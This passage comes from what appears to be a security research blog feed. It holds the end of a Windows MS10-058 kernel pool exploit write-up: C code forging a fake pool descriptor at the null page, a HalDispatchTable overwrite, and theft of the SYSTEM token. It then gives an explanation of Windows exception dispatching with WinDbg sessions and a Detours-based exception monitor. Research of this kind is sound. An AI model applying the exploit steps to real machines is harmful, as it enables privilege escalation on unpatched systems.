</span><span class='line'>ExFreePoolWithTag(x,x)+5CC  mov     edx, _PoolVector[eax*4]
</span><span class='line'>ExFreePoolWithTag(x,x)+5D3  mov     [esp+58h+var_48], edx
</span><span class='line'>ExFreePoolWithTag(x,x)+5D7  mov     edx, [esp+58h+var_40]
</span><span class='line'>ExFreePoolWithTag(x,x)+5DB  and     edx, 20h
</span><span class='line'>ExFreePoolWithTag(x,x)+5DE  mov     [esp+58h+var_20], edx
</span><span class='line'>ExFreePoolWithTag(x,x)+5E2  jz      short loc_5180B6
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>ExFreePoolWithTag(x,x)+5E8  loc_518084:
</span><span class='line'>ExFreePoolWithTag(x,x)+5E8  cmp     _ExpNumberOfNonPagedPools, 1
</span><span class='line'>ExFreePoolWithTag(x,x)+5EF  jbe     short loc_5180CB
</span><span class='line'>
</span><span class='line'>ExFreePoolWithTag(x,x)+5F1  movzx   eax, word ptr [edi]
</span><span class='line'>ExFreePoolWithTag(x,x)+5F4  shr     eax, 9
</span><span class='line'>ExFreePoolWithTag(x,x)+5F7  mov     eax, _ExpNonPagedPoolDescriptor[eax*4]
</span><span class='line'>ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
</span></code></pre></td></tr></table></div></figure>


<p>Therefore, you have to make the pool manager believe that the chunk is located in paged memory.</p>

<h2>Crafting a fake pool descriptor</h2>

<p>As we want a fake pool descriptor at null address. We just allocate this page and put a fake deferred free list and a fake ListHeads.</p>

<p>When freeing a chunk, if the deferred freelist contains at least 0x20 entries, <em>ExFreePoolWithTag</em> is going to actually free those chunks and put them on the appropriate entries of the <em>ListHeads</em>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>*(PCHAR*)0x100 = (PCHAR)0x1208;
</span><span class='line'>*(PCHAR*)0x104 = (PCHAR)0x20;
</span><span class='line'>for (i = 0x140; i &lt; 0x1140; i += 8) {
</span><span class='line'>    *(PCHAR*)i = (PCHAR)WriteAddress-4;
</span><span class='line'>}
</span><span class='line'>*(PINT)0x1200 = (INT)0x060c0a00;
</span><span class='line'>*(PINT)0x1204 = (INT)0x6f6f6f6f;
</span><span class='line'>*(PCHAR*)0x1208 = (PCHAR)0x0;
</span><span class='line'>*(PINT)0x1260 = (INT)0x060c0a0c;
</span><span class='line'>*(PINT)0x1264 = (INT)0x6f6f6f6f;
</span></code></pre></td></tr></table></div></figure>


<h2>Notes</h2>

<p>It is interesting to note that this attack would not work with modern mitigations. Here are a few reasons :</p>

<ul>
<li>Validation of the <em>PoolIndex</em> field</li>
<li>Prevention of the null page allocation</li>
<li><em>NonPagedPoolNX</em> has been introduced with Windows 8 and should be used instead of the <em>NonPagedPool</em> type.</li>
<li>SMAP would prevent access to userland data</li>
<li>SMEP would prevent execution of userland code</li>
</ul>


<h1>Payload and clean-up</h1>

<p>A classical target for write-what-where scenarios is the <em>HalDispatchTable</em>. We just have to overwrite <em>HalDispatchTable+4</em> with a pointer to our payload which is <em>setupPayload()</em>. When we are done, we just have to put back the pointer to <em>hal!HaliQuerySystemInformation</em>. (otherwise you can expect some crashes)</p>

<p>Now that we are able to execute arbitrary code from kernel land we just have to get the <em>_EPROCESS</em> of the attacking process with <em>PsGetCurrentProcess()</em> and walk the list of processes using the <em>ActiveProcessLinks</em> field until we encounter a process with <em>ImageFileName</em> equal to “System”. Then we just replace the access token of the attacker process by the one of the system process. Note that the lazy author of this exploit hardcoded several offsets :).</p>

<p>This is illustrated in <em>payload()</em>.</p>

<p><img class="center" src="http://doar-e.github.io/images/MS10-058/screenshot.png"></p>

<h1>Greetings</h1>

<p>Special thanks to my friend <a href="https://twitter.com/0vercl0k">@0vercl0k</a> for his review and help!</p>

<h1>Conclusion</h1>

<p>I hope you enjoyed this article. If you want to know more about the topic, check out the latest papers of Tarjei Mandt, Zhenhua Liu and Nikita Tarakanov. (or wait for other articles ;) )</p>

<p>You can find my code on my new github <a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">[5]</a>. Don’t hesitate to share comments on my article or my exploit if you see something wrong :)</p>

<h1>References</h1>

<p>[1] <a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html">Vulnerability details on itsecdb</a></p>

<p>[2] <a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058">MS bulletin</a></p>

<p>[3] <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">Kernel Pool Exploitation on Windows 7</a> &ndash; Tarjei Mandt&rsquo;s paper. A must-read!</p>

<p>[4] <a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf">Reserve Objects in Windows 7</a> &ndash; Great j00ru&rsquo;s article!</p>

<p>[5] <a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">The code of my exploit for MS10-058</a></p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Having a look at the Windows' User/Kernel exceptions dispatcher]]></title>
    <link href="http://doar-e.github.io/blog/2013/10/12/having-a-look-at-the-windows-userkernel-exceptions-dispatcher/"/>
    
    <updated>2013-10-12T14:03:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2013/10/12/having-a-look-at-the-windows-userkernel-exceptions-dispatcher</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>The purpose of this little post is to create a piece of code able to monitor exceptions raised in a process (a bit like <a href="http://gynvael.coldwind.pl/">gynvael</a>&rsquo;s <a href="http://gynvael.coldwind.pl/?id=148">ExcpHook</a> but in userland), and to generate a report with information related to the exception. The other purpose is to have a look at the internals of course.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>--Exception detected--
</span><span class='line'>ExceptionRecord: 0x0028fa2c Context: 0x0028fa7c
</span><span class='line'>Image Path: D:\Codes\The Sentinel\tests\divzero.exe
</span><span class='line'>Command Line: ..\tests\divzero.exe divzero.exe
</span><span class='line'>PID: 0x00000aac
</span><span class='line'>Exception Code: 0xc0000094 (EXCEPTION_INT_DIVIDE_BY_ZERO)
</span><span class='line'>Exception Address: 0x00401359
</span><span class='line'>EAX: 0x0000000a EDX: 0x00000000 ECX: 0x00000001 EBX: 0x7ffde000
</span><span class='line'>ESI: 0x00000000 EDI: 0x00000000 ESP: 0x0028fee0 EBP: 0x0028ff18
</span><span class='line'>EIP: 0x00401359
</span><span class='line'>EFLAGS: 0x00010246
</span><span class='line'>
</span><span class='line'>Stack:
</span><span class='line'>0x767bc265 0x54f3620f 0xfffffffe 0x767a0f5a
</span><span class='line'>0x767ffc59 0x004018b0 0x0028ff90 0x00000000
</span><span class='line'>
</span><span class='line'>Disassembly:
</span><span class='line'>00401359 (04) f77c241c                 IDIV DWORD [ESP+0x1c]
</span><span class='line'>0040135d (04) 89442404                 MOV [ESP+0x4], EAX
</span><span class='line'>00401361 (07) c7042424304000           MOV DWORD [ESP], 0x403024
</span><span class='line'>00401368 (05) e833080000               CALL 0x401ba0
</span><span class='line'>0040136d (05) b800000000               MOV EAX, 0x0
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s why I divided this post in two big parts:</p>

<ul>
<li>the first one will talk about Windows internals background required to understand how things work under the hood,</li>
<li>the last one will talk about <a href="http://research.microsoft.com/en-us/projects/detours/"><em>Detours</em></a> and how to hook <em>ntdll!KiUserExceptionDispatcher</em> toward our purpose. Basically, the library gives programmers a set of APIs to easily hook procedures. It also has a clean and readable documentation, so you should use it! It is usually used for that kind of things:

<ul>
<li>Hot-patching bugs (no need to reboot),</li>
<li>Tracing API calls (<a href="http://www.rohitab.com/apimonitor">API Monitor</a> like),</li>
<li>Monitoring (a bit like our example),</li>
<li>Pseudo-sandboxing (prevent API calls),</li>
<li>etc.</li>
</ul>
</li>
</ul>


<div class='entry-content-toc'></div>




<!--more-->


<h1>Lights on <em>ntdll!KiUserExceptionDispatcher</em></h1>

<p>The purpose of this part is to be sure to understand how exceptions are given back to userland in order to be handled (or not) by the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms680657(v=vs.85).aspx">SEH</a>/<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681401(v=vs.85).aspx">UEF</a> mechanisms ; though I&rsquo;m going to focus on Windows 7 x86 because that&rsquo;s the OS I run in my VM. The other objective of this part is to give you the big picture, I mean we are not going into too many details, just enough to write a working exception sentinel PoC later.</p>

<h2>nt!KiTrap*</h2>

<p>When your userland application does something wrong an exception is raised by your CPU: let&rsquo;s say you are trying to do a division by zero (<em>nt!KiTrap00</em> will handle that case), or you are trying to fetch a memory page that doesn&rsquo;t exist (<em>nt!KiTrap0E</em>).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; !idt -a
</span><span class='line'>
</span><span class='line'>Dumping IDT: 80b95400
</span><span class='line'>
</span><span class='line'>00:   8464d200 nt!KiTrap00
</span><span class='line'>01:   8464d390 nt!KiTrap01
</span><span class='line'>02:   Task Selector = 0x0058
</span><span class='line'>03:   8464d800 nt!KiTrap03
</span><span class='line'>04:   8464d988 nt!KiTrap04
</span><span class='line'>05:   8464dae8 nt!KiTrap05
</span><span class='line'>06:   8464dc5c nt!KiTrap06
</span><span class='line'>07:   8464e258 nt!KiTrap07
</span><span class='line'>08:   Task Selector = 0x0050
</span><span class='line'>09:   8464e6b8 nt!KiTrap09
</span><span class='line'>0a:   8464e7dc nt!KiTrap0A
</span><span class='line'>0b:   8464e91c nt!KiTrap0B
</span><span class='line'>0c:   8464eb7c nt!KiTrap0C
</span><span class='line'>0d:   8464ee6c nt!KiTrap0D
</span><span class='line'>0e:   8464f51c nt!KiTrap0E
</span><span class='line'>0f:   8464f8d0 nt!KiTrap0F
</span><span class='line'>10:   8464f9f4 nt!KiTrap10
</span><span class='line'>11:   8464fb34 nt!KiTrap11
</span><span class='line'>[...]
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m sure you already know that but in x86 Intel processors there is a table called the <a href="http://wiki.osdev.org/Interrupt_Descriptor_Table">IDT</a> that stores the different routines that will handle the exceptions. The virtual address of that table is stored in a special x86 register called <em>IDTR</em>, and that register is accessible only by using the instructions <em>sidt</em> (Stores Interrupt Descriptor Table register) and <em>lidt</em> (Loads Interrupt Descriptor Table register).</p>

<p>Basically there are two important things in an IDT entry: the address of the <a href="https://en.wikipedia.org/wiki/Interrupt_handler">ISR</a>, and the segment selector (remember it&rsquo;s a simple index in the <a href="http://wiki.osdev.org/GDT_Tutorial">GDT</a>) the CPU should use.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; !pcr
</span><span class='line'>KPCR for Processor 0 at 84732c00:
</span><span class='line'>    [...]
</span><span class='line'>                    IDT: 80b95400
</span><span class='line'>                    GDT: 80b95000
</span><span class='line'>
</span><span class='line'>kd&gt; dt nt!_KIDTENTRY 80b95400
</span><span class='line'>   +0x000 Offset           : 0xd200
</span><span class='line'>   +0x002 Selector         : 8
</span><span class='line'>   +0x004 Access           : 0x8e00
</span><span class='line'>   +0x006 ExtendedOffset   : 0x8464
</span><span class='line'>
</span><span class='line'>kd&gt; ln (0x8464 &lt;&lt; 10) + (0xd200)
</span><span class='line'>Exact matches:
</span><span class='line'>    nt!KiTrap00 (&lt;no parameter info&gt;)
</span><span class='line'>
</span><span class='line'>kd&gt; !@display_gdt 80b95000
</span><span class='line'>
</span><span class='line'>#################################
</span><span class='line'># Global Descriptor Table (GDT) #
</span><span class='line'>#################################
</span><span class='line'>
</span><span class='line'>Processor 00
</span><span class='line'>Base : 80B95000    Limit : 03FF
</span><span class='line'>
</span><span class='line'>Off.  Sel.  Type    Sel.:Base  Limit   Present  DPL  AVL  Informations
</span><span class='line'>----  ----  ------  ---------  ------- -------  ---  ---  ------------
</span><span class='line'>[...]
</span><span class='line'>0008  0008  Code32  00000000  FFFFFFFF  YES     0    0    Execute/Read, accessed  (Ring 0)CS=0008
</span><span class='line'>[...]
</span></code></pre></td></tr></table></div></figure>


<p>The entry just above tells us that for the processor 0, if a <em>division-by-zero</em> exception is raised the kernel mode routine nt!KiTrap00 will be called with a flat-model code32 ring0 segment (cf GDT dump).</p>

<p>Once the CPU is in <em>nt!KiTrap00</em>&rsquo;s code it basically does a lot of things, same thing for all the other <em>nt!KiTrap</em> routines, but somehow they (more or less) end up in the kernel mode exceptions dispatcher: <em>nt!KiDispatchException</em> (remember <a href="http://gynvael.coldwind.pl/">gynvael</a>&rsquo;s tool ? He was hooking that method!) once they created the <em>nt!_KTRAP_FRAME</em> structure associated with the fault.</p>

<p><img class="center" src="http://doar-e.github.io/images/ntdll.KiUserExceptionDispatcher/butterfly.png" title="nt!KiExceptionDispatch graph from ReactOS" ></p>

<p>Now, you may already have asked yourself how the kernel reaches back to the userland in order to process the exception via the SEH mechanism for example ?</p>

<p>That&rsquo;s kind of simple actually. The trick used by the Windows kernel is to check where the exception took place: if it&rsquo;s from user mode, the kernel mode exceptions dispatcher sets the field <em>eip</em> of the trap frame structure (passed in argument) to the symbol <em>nt!KeUserExceptionDispatcher</em>. Then, <em>nt!KeEloiHelper</em> will use that same trap frame to resume the execution (in our case on <em>nt!KeUserExceptionDispatcher</em>).</p>

<p>But guess what ? That symbol holds the address of <em>ntdll!KiUserExceptionDispatcher</em>, so it makes total sense!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; dps nt!KeUserExceptionDispatcher L1
</span><span class='line'>847a49a0  77476448 ntdll!KiUserExceptionDispatcher
</span></code></pre></td></tr></table></div></figure>


<p>If like me you like illustrations, I&rsquo;ve made a WinDbg session where I am going to show what we just talked about. First, let&rsquo;s trigger our <em>division-by-zero</em> exception:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; bp nt!KiTrap00
</span><span class='line'>kd&gt; g
</span><span class='line'>Breakpoint 0 hit
</span><span class='line'>nt!KiTrap00:
</span><span class='line'>8464c200 6a00            push    0
</span><span class='line'>kd&gt; k
</span><span class='line'>ChildEBP RetAddr
</span><span class='line'>8ec9bd98 01141269 nt!KiTrap00
</span><span class='line'>8ec9bd9c 00000000 divzero+0x1269
</span><span class='line'>kd&gt; u divzero+0x1269 l1
</span><span class='line'>divzero+0x1269:
</span><span class='line'>01141269 f7f0            div     eax,eax
</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s go a bit further in the ISR, and more precisely when the <em>nt!_KTRAP_FRAME</em> is built:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; bp nt!KiTrap00+0x36
</span><span class='line'>kd&gt; g
</span><span class='line'>Breakpoint 1 hit
</span><span class='line'>nt!KiTrap00+0x36:
</span><span class='line'>8464c236 8bec            mov     ebp,esp
</span><span class='line'>kd&gt; dt nt!_KTRAP_FRAME @esp
</span><span class='line'>   +0x000 DbgEbp           : 0x1141267
</span><span class='line'>   +0x004 DbgEip           : 0x1141267
</span><span class='line'>   +0x008 DbgArgMark       : 0
</span><span class='line'>   +0x00c DbgArgPointer    : 0
</span><span class='line'>   +0x010 TempSegCs        : 0
</span><span class='line'>   +0x012 Logging          : 0 &#39;&#39;
</span><span class='line'>   +0x013 Reserved         : 0 &#39;&#39;
</span><span class='line'>   +0x014 TempEsp          : 0
</span><span class='line'>   +0x018 Dr0              : 0
</span><span class='line'>   +0x01c Dr1              : 0
</span><span class='line'>   +0x020 Dr2              : 0
</span><span class='line'>   +0x024 Dr3              : 0x23
</span><span class='line'>   +0x028 Dr6              : 0x23
</span><span class='line'>   +0x02c Dr7              : 0x1141267
</span><span class='line'>   +0x030 SegGs            : 0
</span><span class='line'>   +0x034 SegEs            : 0x23
</span><span class='line'>   +0x038 SegDs            : 0x23
</span><span class='line'>   +0x03c Edx              : 0x1141267
</span><span class='line'>   +0x040 Ecx              : 0
</span><span class='line'>   +0x044 Eax              : 0
</span><span class='line'>   +0x048 PreviousPreviousMode : 0
</span><span class='line'>   +0x04c ExceptionList    : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
</span><span class='line'>   +0x050 SegFs            : 0x270030
</span><span class='line'>   +0x054 Edi              : 0
</span><span class='line'>   +0x058 Esi              : 0
</span><span class='line'>   +0x05c Ebx              : 0x7ffd3000
</span><span class='line'>   +0x060 Ebp              : 0x27fd58
</span><span class='line'>   +0x064 ErrCode          : 0
</span><span class='line'>   +0x068 Eip              : 0x1141269
</span><span class='line'>   +0x06c SegCs            : 0x1b
</span><span class='line'>   +0x070 EFlags           : 0x10246
</span><span class='line'>   +0x074 HardwareEsp      : 0x27fd50
</span><span class='line'>   +0x078 HardwareSegSs    : 0x23
</span><span class='line'>   +0x07c V86Es            : 0
</span><span class='line'>   +0x080 V86Ds            : 0
</span><span class='line'>   +0x084 V86Fs            : 0
</span><span class='line'>   +0x088 V86Gs            : 0
</span><span class='line'>kd&gt; .trap @esp
</span><span class='line'>ErrCode = 00000000
</span><span class='line'>eax=00000000 ebx=7ffd3000 ecx=00000000 edx=01141267 esi=00000000 edi=00000000
</span><span class='line'>eip=01141269 esp=0027fd50 ebp=0027fd58 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
</span><span class='line'>divzero+0x1269:
</span><span class='line'>001b:01141269 f7f0            div     eax,eax
</span><span class='line'>kd&gt; .trap
</span><span class='line'>Resetting default scope
</span></code></pre></td></tr></table></div></figure>


<p>The idea now is to track the modification of the <em>nt!_KTRAP_FRAME.Eip</em> field as we discussed earlier (BTW, don&rsquo;t try to put directly a breakpoint on <em>nt!KiDispatchException</em> with VMware, it just blows my guest virtual machine) via a hardware-breakpoint:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; ba w4 esp+68
</span><span class='line'>kd&gt; g
</span><span class='line'>Breakpoint 2 hit
</span><span class='line'>nt!KiDispatchException+0x3d6:
</span><span class='line'>846c559e c745fcfeffffff  mov     dword ptr [ebp-4],0FFFFFFFEh
</span><span class='line'>kd&gt; dt nt!_KTRAP_FRAME Eip @esi
</span><span class='line'>   +0x068 Eip : 0x77b36448
</span><span class='line'>kd&gt; ln 0x77b36448
</span><span class='line'>Exact matches:
</span><span class='line'>    ntdll!KiUserExceptionDispatcher (&lt;no parameter info&gt;)
</span></code></pre></td></tr></table></div></figure>


<p>OK, so here we can clearly see the trap frame has been modified (keep in mind WinDbg gives you the control <em>after</em> the actual writing). That basically means that when the kernel will resume the execution via <em>nt!KiExceptionExit</em> (or <em>nt!Kei386EoiHelper</em>, two symbols for one same address) the CPU will directly execute the user mode exceptions dispatcher.</p>

<p>Great, I think we have now enough understanding to move on the second part of the article.</p>

<h1>Serial Detourer</h1>

<p>In this part we are going to talk about Detours, what looks like the API and how you can use it to build a userland exceptions sentinel without too many lines of codes. Here is the list of the features we want:</p>

<ul>
<li>To hook <em>ntdll!KiUserExceptionDispatcher</em>: we will use Detours for that,</li>
<li>To generate a tiny readable exception report: for the disassembly part we will use <a href="http://www.ragestorm.net/distorm/">Distorm</a> (yet another easy cool library to use),</li>
<li>To focus x86 architecture: because unfortunately the express version doesn&rsquo;t work for x86_64.</li>
</ul>


<p>Detours is going to modify the first bytes of the API you want to hook in order to redirect its execution in your piece of code: it&rsquo;s called an <em>inline-hook</em>.</p>

<p><img class="center" src="http://doar-e.github.io/images/ntdll.KiUserExceptionDispatcher/detours.png"></p>

<p>Detours can work in two modes:</p>

<ul>
<li>A first mode where you don&rsquo;t touch to the binary you&rsquo;re going to hook, you will need a DLL module you will inject into your binary&rsquo;s memory. Then, Detours will modify in-memory the code of the APIs you will hook. That&rsquo;s what we are going to use.</li>
<li>A second mode where you modify the binary file itself, more precisely the <a href="http://sandsprite.com/CodeStuff/Understanding_imports.html">IAT</a>. In that mode, you won&rsquo;t need to have a DLL injecter. If you are interested in details about those tricks they described them in the <em>Detours.chm</em> file in the installation directory, read it!</li>
</ul>


<p>So our sentinel will be divided in two main parts:</p>

<ul>
<li>A program that will start the target binary and inject our DLL module (that&rsquo;s where all the important things are),</li>
<li>The sentinel DLL module that will hook the userland exceptions dispatcher and write the exception report.</li>
</ul>


<p>The first one is really easy to implement using <a href="https://github.com/0vercl0k/stuffz/blob/master/The%20Sentinel/ProcessSpawner/main.cpp#L66">DetourCreateProcessWithDll</a>: it&rsquo;s going to create the process and inject the DLL we want.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Usage: ./ProcessSpawner &lt;full path dll&gt; &lt;path executable&gt; &lt;excutable name&gt; [args..]
</span></code></pre></td></tr></table></div></figure>


<p>To successfully hook a function you have to know its address of course, and you have to implement the hook function. Then, you have to call <em>DetourTransactionBegin</em>, <em>DetourUpdateThread</em>, <em>DetourTransactionCommit</em> and you&rsquo;re done, wonderful isn&rsquo;t it ?</p>

<p>The only tricky thing, in our case, is that we want to hook <em>ntdll!KiUserExceptionDispatcher</em>, and that function has its own custom calling convention. Fortunately for us, in the <em>samples</em> directory of Detours you can find how you are supposed to deal with that specific case:</p>

<figure class='code'><figcaption><span>KiUserExceptionDispatcher hook</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">VOID</span> <span class="nf">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="n">NTAPI</span> <span class="n">KiUserExceptionDispatcher</span><span class="p">(</span><span class="n">PEXCEPTION_RECORD</span> <span class="n">ExceptionRecord</span><span class="p">,</span> <span class="n">PCONTEXT</span> <span class="n">Context</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="cm">/* Taken from the Excep&#39;s detours sample */</span>
</span><span class='line'>    <span class="kr">__asm</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">xor</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>                <span class="p">;</span> <span class="c1">// Create fake return address on stack.</span>
</span><span class='line'>        <span class="n">push</span>    <span class="n">eax</span>                     <span class="p">;</span> <span class="c1">// (Generally, we are called by the kernel.)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">push</span>    <span class="n">ebp</span>                     <span class="p">;</span> <span class="c1">// Prolog</span>
</span><span class='line'>        <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>                <span class="p">;</span>
</span><span class='line'>        <span class="n">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="n">__LOCAL_SIZE</span>       <span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">EnterCriticalSection</span><span class="p">(</span><span class="o">&amp;</span><span class="n">critical_section</span><span class="p">);</span>
</span><span class='line'>    <span class="n">log_exception</span><span class="p">(</span><span class="n">ExceptionRecord</span><span class="p">,</span> <span class="n">Context</span><span class="p">);</span>
</span><span class='line'>    <span class="n">LeaveCriticalSection</span><span class="p">(</span><span class="o">&amp;</span><span class="n">critical_section</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="kr">__asm</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">mov</span>     <span class="n">ebx</span><span class="p">,</span> <span class="n">ExceptionRecord</span>    <span class="p">;</span>
</span><span class='line'>        <span class="n">mov</span>     <span class="n">ecx</span><span class="p">,</span> <span class="n">Context</span>            <span class="p">;</span>
